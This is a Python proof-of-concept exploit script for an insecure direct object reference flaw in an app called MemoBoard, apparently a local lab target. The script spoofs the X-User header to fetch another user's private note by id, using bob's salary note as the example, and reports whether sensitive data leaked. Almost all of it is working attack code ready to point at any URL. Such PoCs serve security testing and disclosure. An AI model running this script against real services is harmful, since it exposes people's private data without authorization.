#!/usr/bin/env python3
"""PoC: MemoBoard IDOR — read any user's private note without authorization

GET /api/notes/<id> reads X-User header but never checks ownership.
Any user can read any note by id, including bob's private salary note.
"""
import argparse
import json
import os
import urllib.request


def never_bypass(host, **kwargs):
    return False


def opener(proxy: str):
    if not proxy:
        return urllib.request.build_opener()
    os.environ["no_proxy"] = ""
    os.environ["NO_PROXY"] = ""
    urllib.request.proxy_bypass = never_bypass
    if hasattr(urllib.request, "proxy_bypass_environment"):
        urllib.request.proxy_bypass_environment = never_bypass
    if hasattr(urllib.request, "proxy_bypass_registry"):
        urllib.request.proxy_bypass_registry = never_bypass
    handler = urllib.request.ProxyHandler({"http": proxy, "https": proxy})
    return urllib.request.build_opener(handler)


def main() -> int:
    p = argparse.ArgumentParser(description="MemoBoard IDOR PoC")
    p.add_argument("-u", "--url", required=True, help="Target origin, e.g. http://127.0.0.1:5000")
    p.add_argument("--proxy", default="", help="HTTP proxy, e.g. http://127.0.0.1:8080; empty=direct")
    p.add_argument("--note-id", type=int, default=2, help="Note ID to access (default: 2 = bob's private salary)")
    p.add_argument("--x-user", default="alice", help="X-User header value (spoofed identity)")
    args = p.parse_args()

    base = args.url.rstrip("/")
    http = opener(args.proxy)

    # Access arbitrary note by ID with a different user's identity in X-User
    url = f"{base}/api/notes/{args.note_id}"
    req = urllib.request.Request(url, headers={
        "X-User": args.x_user,
        "Accept": "application/json",
    })
    print(f"[*] Request: GET {url}")
    print(f"[*] X-User header: {args.x_user} (spoofed identity)")
    try:
        resp = http.open(req, timeout=15)
        status = resp.status
        body = resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        status = e.code
        body = e.read().decode("utf-8", errors="replace")
    except Exception as e:
        print(f"[!] Error: {e}")
        return 1

    print(f"[*] HTTP Status: {status}")
    print(f"[*] Response Body:")
    print(body)

    if status == 200:
        try:
            data = json.loads(body)
            author = data.get("author", "")
            note_body = data.get("body", "")
            print(f"\n[+] Note author: {author}")
            print(f"[+] Note body: {note_body}")
            if author != args.x_user:
                print(f"\n[+] SUCCESS: IDOR confirmed — accessed {author}'s note while claiming to be {args.x_user}.")
                if "128000" in note_body or "salary" in note_body.lower() or "confidential" in note_body.lower():
                    print(f"[+] Sensitive data exposed: private salary information leaked.")
                return 0
            else:
                print(f"\n[-] Note belongs to the claimed user — not an IDOR.")
                return 1
        except json.JSONDecodeError:
            print("\n[!] Response is not valid JSON.")
            return 1
    else:
        print(f"\n[-] Request failed with status {status}.")
        return 1


if __name__ == "__main__":
    raise SystemExit(main())